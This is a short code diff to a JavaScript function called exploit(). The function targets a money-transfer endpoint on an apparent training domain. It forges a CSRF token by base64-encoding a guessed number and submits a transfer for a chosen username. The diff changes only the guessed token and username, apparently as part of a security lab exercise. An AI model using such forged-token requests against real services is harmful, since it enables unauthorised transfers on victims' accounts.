@@ -9,11 +9,11 @@
         async function exploit() {
             const target = "https://phish-me.quoccacorp.com/api/transfer";
 
-            let token = btoa(8624);
+            let token = btoa(8637);
 
             let body = new URLSearchParams();
             body.append('csrf_token', token);
-            body.append('username', 'z5631970');
+            body.append('username', 'z5631971');
             body.append('amount', '1');
 
             return await fetch(target, {
